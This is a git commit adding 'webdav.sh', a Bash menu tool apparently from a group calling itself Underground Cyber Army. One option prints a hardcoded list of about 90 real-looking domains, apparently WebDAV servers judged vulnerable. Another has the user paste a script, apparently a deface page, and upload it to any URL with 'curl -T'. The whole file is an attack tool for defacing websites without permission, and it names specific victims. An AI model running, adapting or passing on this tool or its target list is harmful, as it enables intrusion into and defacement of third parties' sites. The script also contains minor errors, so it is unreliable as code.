190d07815038d6accfdb1349c3fa04640e18d043
TeamUCA <45895481+TeamUCA@users.noreply.github.com>
2019-02-15 18:23:35 +0800

    Add files via upload

---
+++ webdav.sh
@@ -0,0 +1,170 @@
+#!/usr/bin/bash
+
+clear
+#colors
+cyan='\033[1;36m'
+green='\033[1;32m'
+red='\033[1;31m'
+yellow='\033[1;33m'
+blue='\033[1;34m'
+purple='\033[1;35m'
+reset='\033[0m'
+sleep 1
+echo  "$green                 ________________________________________"
+sleep 1
+echo    $yellow"                 |[              UNDERGROUND           ]|"
+sleep 1
+echo $yellow     "                |[                CYBER               ]|"
+sleep 1
+echo $yellow   "                |[                 ARMY               ]|"
+echo   $green"                 ________________________________________"
+sleep 1
+echo " "
+echo   " =============================="
+sleep 1
+echo   "           WEBDAV TOOLS"
+sleep 1
+echo   " =============================="
+sleep 1
+echo 
+lagi=1
+while [ $lagi -lt 3 ];
+do
+echo ""
+sleep 2
+echo  $yellow "1. Webvuln${enda}"; 
+echo  $yellow"============================" 
+sleep 2
+echo  $green "2. Webdav${endcla}"; 
+echo  $green"============================" 
+sleep 2
+echo  $red "3. Keluar${enda}"; 
+echo  $red"============================" 
+
+echo ""
+echo  "silahkan" |lolcat
+read -p  "nomor >>> " pil ;
+
+# webdav
+
+case $pil in
+2) 
+pkg install vim
+pkg install curl
+echo "===== Tulis nama sc lu =====" | lolcat
+read a
+echo "keterangan : "
+echo ">Copas text sc" | lolcat
+echo ">kalo sudah tercopas tekan :wq" | lolcat 
+sleep 2
+vim $a
+sleep 3
+echo "===>Masukan link<==="
+read c
+curl -T $a $c
+echo "liat $c/$a" | lolcat
+echo
+
+;;
+
+# webnya 
+
+1) 
+echo "=> Waiting..." | lolcat
+sleep 2
+echo " "
+echo "delightimages.com 
+devjeeinternational.com 
+entitledvip.com
+ esfml.com
+ essentialtours.com
+ firewall.inkspot.co.za 
+fishingdirectory.co.za
+ forget-me-not.co.za 
+frankadesign.com 
+grupo-cma.com 
+handj.co.za 
+hellomobile.mobi 
+ilovemandela.com 
+infussion.co.za 
+jormid.com 
+jormid.net 
+kevinbutho.com 
+kreame.com 
+lethaithuba.org 
+liveingroup.com
+ marjoriebresler.com 
+mc3qs.com
+ montdestin.com 
+my-resume.biz 
+naturaleyeimages.com
+ netcallcollect.co.za 
+ns1.crimsonmonkeyweb.com ns2.crimsonmonkeyweb.com 
+nyiko.info
+ opiniong.com
+ orbfusion.com 
+ospreygroup.co.za 
+prorepafrica.com
+ quintessential-tours.com 
+rollaslat.com
+ rooftruss.co.za 
+saspp.org 
+savanacloud.com 
+sieteconsulting.com
+ southernafricablog.com
+ stand66.com 
+tapifare.com 
+techdirect.co.za 
+thehellenic.co.za 
+thepremiummakers.com 
+totemafrica.com 
+trafficam.co.za 
+umkhondo.com
+ wesiya-com.win24.wadns.net
+ whadiz.com 
+whosting.co.za 
+win24.wadns.net 
+www.delightimages.com 
+www.esfml.com 
+www.fishingdirectory.co.za
+ www.ittrader.co.za
+ www.lunique.co.za
+ www.marjoriebresler.com 
+www.moneyin1week.co.za 
+www.rclaser.co.za
+ www.rooftruss.co.za 
+www.umkhondo.com 
+www.whosting.co.za 
+ziady.com
+123guitarmastery.com
+15thstreetkitchen.com
+1stmotor.com
+24b.com.co
+2mimprovements.com
+2perkins.com
+3117training.com
+333peru.com
+3d-casino.com
+410garfieldfilms.com
+4wieders.com
+5ebels.com
+5pointsolutions.net
+60sbar.com
+6holmes.com"
+echo " "
+sleep 2
+echo "=>silahkan copas<=" | lolcat
+
+;;
+
+
+
+3) echo "                ===== Thanks udah gunakan tools kami =====" | lolcat
+   echo "                        =====salam dari U.C.A=====" | lolcat
+   echo "                              AUTHOR BY ZAK" | lolcat
+exit
+;;
+
+esac
+done
+done
